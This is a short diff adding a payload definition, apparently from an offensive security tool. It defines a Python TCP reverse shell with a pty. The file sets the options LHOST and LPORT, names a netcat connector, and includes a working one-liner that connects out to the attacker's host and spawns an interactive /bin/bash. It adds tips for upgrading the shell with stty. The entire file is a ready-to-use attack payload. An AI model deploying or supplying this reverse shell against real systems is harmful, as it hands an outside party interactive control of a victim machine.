@@ -1,0 +1,5 @@
+title=Python TCP reverse shell pty payload
+info=ready to maket it interactive: ctrl+z -> stty raw -echo -> fg -> stty columns # rows #
+required_opts=LHOST;LPORT
+connector=reverse_tcp_netcat
+payload=/usr/bin/env python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);os.putenv("TERM","xterm-256color");os.putenv("SHELL","/bin/bash");pty.spawn("/bin/bash");'
